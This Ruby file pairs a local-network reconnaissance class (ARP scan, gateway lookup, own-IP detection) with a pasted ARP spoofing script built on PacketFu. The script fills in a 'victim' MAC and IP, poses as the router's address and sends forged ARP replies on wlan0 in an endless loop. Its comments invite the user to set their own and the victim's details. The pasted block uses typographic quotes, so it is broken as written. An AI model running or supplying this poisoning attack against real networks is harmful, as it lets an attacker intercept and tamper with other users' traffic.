
require 'arp_scan'
require 'socket'

class IPTools

  attr_reader :arp_hosts
  attr_reader :gateway_IP
  attr_reader :my_ip
  
  def initialize()
    @arp_hosts = ARPScan('--localnet').hosts
    @gateway_IP = `ip route show`[/default.*/][/\d+\.\d+\.\d+\.\d+/]
    @my_ip = get_my_ip()
  end

  def same_subnet?(ip1, ip2)
    ip1 = ip1.split '.'
    ip2 = ip2.split '.'
    same = true
    3.times do |i|
      unless ip1[i] == ip2[i]
        same = false
      end
    end
    same
  end

  private
  def get_my_ip()
    my_ip = nil
    Socket.ip_address_list.each do |local|
      @arp_hosts.each do |arp|
        if same_subnet? arp.ip_addr, local.ip_address
          my_ip = local.ip_address
        end
      end
    end
    return my_ip
  end
end

tools = IPTools.new 

puts "My IP: #{tools.my_ip}"

puts "Gateway IP: #{tools.gateway_IP}"

puts 'ARP IPs'
tools.arp_hosts.each {|x| puts x.ip_addr}

'''
require “packetfu”

puts “Sending ARP Packet Spoof Every 30 Seconds…”
x = PacketFu::ARPPacket.new(:ﬂavor => “Linux”) # Flavor can be changed to Windows or hp_deskjet
x.eth_saddr=”04:7d:7b:c5:98:cf” # Set your MAC Address
x.eth_daddr=”00:0c:76:17:a4:17″ # Set victim MAC Address
x.arp_saddr_mac=”04:7d:7b:c5:98:cf” # Set your MAC Address
x.arp_daddr_mac=”00:0c:76:17:a4:17″ # Set victim MAC Address
x.arp_saddr_ip=’192.168.1.254′ # Router IP Address
x.arp_daddr_ip=”192.168.1.79″ # Victim IP Address
x.arp_opcode=2 # ARP Reply Code 
sunny=false # Condition Set
while sunny==false do # Infinite Loop created
  x.to_w(‘wlan0′) # Put Packet to wire – Can change to eth0
  sleep(30) # “Sleep” interval in seconds, change for your preference
end
'''

